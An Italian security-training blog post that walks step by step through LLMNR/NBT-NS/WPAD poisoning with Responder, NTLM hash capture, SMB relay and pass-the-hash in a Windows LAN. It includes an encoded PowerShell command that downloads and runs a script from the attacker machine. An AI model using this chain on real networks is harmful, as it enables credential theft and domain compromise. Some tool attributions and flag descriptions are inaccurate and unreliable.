---
title: >-
  Responder: Attacco LLMNR, NBT-NS e WPAD in LAN per Rubare Hash NTLM come un
  Vero Red Teamer
description: >-
  Scopri come un attaccante può sfruttare protocolli deboli come LLMNR, NBT-NS e
  WPAD per rubare credenziali di rete usando Responder e MultiRelay. Una guida
  completa e realistica per chi fa pentesting interno o vuole capire davvero
  come funzionano gli attacchi alle LAN Windows.
image: /responder.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - responder
  - mitm
slug: "responder"
---

# From Broadcast to Domain Admin: Una Simulazione di Attacco con LLMNR/NBNS Poisoning e SMB Relay

*Ambiente di Testing Autorizzato - Report Red Team*

**Situazione iniziale:** Ti trovi in una rete interna dopo un primo foothold basilare. L’obiettivo è l’escalation di privilegi e la movimentazione laterale. Il DNS è ben configurato, ma l’esperienza dice che dove c’è Windows, spesso ci sono fallback insicuri pronti a parlare. È ora di ascoltare.

## Fase 1: Avvio del Poisoning – L’Attesa della Vittima

Il primo passo è mettersi in ascolto e iniziare a rispondere alle richieste di nome che DNS ignora. Usiamo **Responder**. La sua forza è la semplicità: avvelena le risoluzioni LLMNR (Link-Local Multicast Name Resolution – UDP 5355) e NBT-NS (NetBIOS Name Service – UDP 137), facendosi passare per il server che la vittima sta cercando.

```bash
sudo responder -I eth0 -dwv
```

**Spiegazione dei flag:**

* `-I eth0`: L’interfaccia di rete.
* `-d`: Abilita le risposte per le richieste di dominio (wpad, isatap, ecc.).
* `-w`: Avvia il server HTTP falso per catturare autenticazioni.
* `-v`: Verboso, per vedere l’azione in tempo reale.

**Output di esempio al momento dell’attivazione:**

```
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [OFF]

[+] Servers:
    HTTP server                [ON]
    SMB server                 [ON]
    [...]
[+] Listening for events...
```

Ora siamo in attesa. Nel giro di pochi minuti, spesso secondi, un client Windows proverà ad accedere a una condivisione di rete con un percorso sbagliato (es. `\\fileserver01\` invece di `\\fileserver01.corp.local\`). Il DNS fallirà, e il client manderà una richiesta in broadcast/multicast: "Hey, qualcuno conosce `FILESERVER01`?".

**È qui che colpiamo.** Responder risponderà per primo: "Eccomi, sono io `FILESERVER01`". Il client, fiducioso, inizierà un tentativo di autenticazione SMB o HTTP verso di noi.

## Fase 2: Cattura dell’Hash NTLMv2 – Il Tesoro in Forma di Hash

Quando la vittima tenta di autenticarsi, non invia la password in chiaro, ma un **hash NTLMv2**. Per ora, ci basta catturarlo.

**Output di esempio di una cattura riuscita:**

```
[SMB] NTLMv2-SSP Client   : 192.168.1.15
[SMB] NTLMv2-SSP Username : CORP\mrossi
[SMB] NTLMv2-SSP Hash     : mrossi::CORP:1122334455667788:2F0A5BD1E...[truncated]...7A55B:010100000...[truncated]
```

Abbiamo l’username (`CORP\mrossi`) e il suo hash NTLMv2. Questo hash è crackabile con strumenti come Hashcat, ma è un processo computazionalmente costoso. Il vero potere, però, non è nel cracking, ma nel **relay**.

## Fase 3: L’Abuso di WPAD – Un Vettore Altamente Efficace

Spesso, le catture più succose arrivano non da errori dell’utente, ma da processi automatici di sistema. **WPAD (Web Proxy Auto-Discovery)** è uno di questi. I sistemi Windows, per impostazione predefinita, tentano di trovare automaticamente un proxy di rete risolvendo il nome `WPAD`.

Con il flag `-d` attivo, Responder risponde anche a queste richieste, avviando un proxy HTTP falso. Quando un client (spesso con privilegi elevati come un servizio di sistema) tenta di autenticarsi al proxy `WPAD`, ci regala il suo hash.

```bash
[HTTP] NTLMv2-SSP Client   : 192.168.1.20
[HTTP] NTLMv2-SSP Username : CORP\SRV_ACCOUNT$
[HTTP] NTLMv2-SSP Hash     : SRV_ACCOUNT$::CORP:AAEEFF...[truncated]...
```

Questo è un hash di un *account computer* (`$`), spesso privilegiato. È un bersaglio perfetto per il passo successivo.

## Fase 4: SMB Relay con MultiRelay – Dall’Hash all’Esecuzione

Catturare un hash è buono, ma **riutilizzarlo (relayarlo)** in tempo reale verso un altro sistema è meglio. Il rischio qui è che il sistema target richieda **SMB Signing**. Se disattivo, possiamo prendere il controllo.

Prima, scansioniamo la rete per individuare host con SMB Signing disabilitato. Usiamo un tool come `RunFinger.py` (parte della suite Impacket) o `crackmapexec`.

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/RunFinger.py -r 192.168.1.0/24 | grep -B2 "Signing:False"
```

**Output:**

```
Host: 192.168.1.25 (DC02)
OS: Windows Server 2019
Signing: False  <<< VULNERABILE AL RELAY
```

Perfetto. `192.168.1.25` non richiede la firma SMB. Ora possiamo usare **MultiRelay** (parte di Responder) o **ntlmrelayx.py** di Impacket per l'attacco vero e proprio. Qui uso `ntlmrelayx` per la sua flessibilità.

Configuriamo ntlmrelayx per inoltrare (relay) qualsiasi autenticazione catturata verso il target vulnerabile (`192.168.1.25`) ed eseguire un comando.

```bash
sudo python3 ntlmrelayx.py -t smb://192.168.1.25 -smb2support -c "powershell -enc SQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA="
```

**Spiegazione:**

* `-t smb://192.168.1.25`: Il target del relay.
* `-smb2support`: Supporto per SMB2.
* `-c "powershell -enc ..."`: Comando da eseguire sul target. In questo caso, un comando PowerShell offuscato che scarica ed esegue uno script dalla nostra macchina.

Ora, quando la vittima `CORP\mrossi` o l'account computer `CORP\SRV_ACCOUNT$` tenterà di autenticarsi al nostro Responder, ntlmrelayx intercetterà l'handshake NTLM e lo reindirizzerà a `192.168.1.25`. Se l'account ha privilegi di amministratore locale su quel server, il nostro comando PowerShell verrà eseguito, dandoci un guscio o aprendo una backdoor.

## Fase 5: Pass-the-Hash (PtH) – Movimentazione Laterale Diretta

A volte, catturiamo un hash ma il relay non è possibile (tutti i server richiedono SMB signing). Se l'hash è valido, possiamo usarlo direttamente per autenticarci su altri servizi, una tecnica chiamata **Pass-the-Hash**.

Usiamo `crackmapexec` o `psexec.py` di Impacket.

```bash
crackmapexec smb 192.168.1.0/24 -u 'mrossi' -H 'aad3b435b51404eeaad3b435b51404ee:2F0A5BD1E...[truncated NTLM hash]...' --local-auth
```

Oppure, per ottenere una shell immediata su un host specifico:

```bash
sudo python3 psexec.py 'CORP/mrossi@192.168.1.30' -hashes :2F0A5BD1E...[truncated]... -codec cp850
```

Questa tecnica bypassa completamente la necessità di conoscere la password in chiaro. L'hash *è* la credenziale.

## Conclusione della Simulazione

Questa catena—**LLMNR/NBT-NS Poisoning → Cattura Hash NTLM → SMB Relay/Pass-the-Hash**—rimane incredibilmente efficace in ambienti reali. La chiave non è uno strumento magico, ma la comprensione profonda di protocolli legacy (LLMNR, NBNS) e del flusso di autenticazione NTLM. In un ambiente controllato, dimostra come una semplice richiesta di rete malformata possa essere il punto di partenza per il completo compromesso del dominio.

***

### Vuoi Padroneggiare Queste Tecniche sul Serio?

Questa simulazione è solo un assaggio. La vera **sicurezza offensiva** richiede una comprensione metodica, ambienti di lab sicuri e una guida esperta.

**Hackita** è proprio questo: un progetto formativo che offre:

* **Formazione 1:1 e Mentorship** personalizzata per costruire le tue competenze di Red Teaming e Pentesting.
* **Corsi Aziendali** su misura per addestrare i tuoi team alle ultime minacce.
* Un approccio **pratico, etico e orientato alla consapevolezza**.

Il nostro scopo è elevare le difese attraverso la conoscenza. Se credi in questo progetto, puoi supportarlo anche con una **donazione**.

**Impara. Sperimenta. Previeni. Solo in ambienti autorizzati.**

[Hackita – Formazione Etica in Sicurezza Offensiva](https://www.hackita.it)
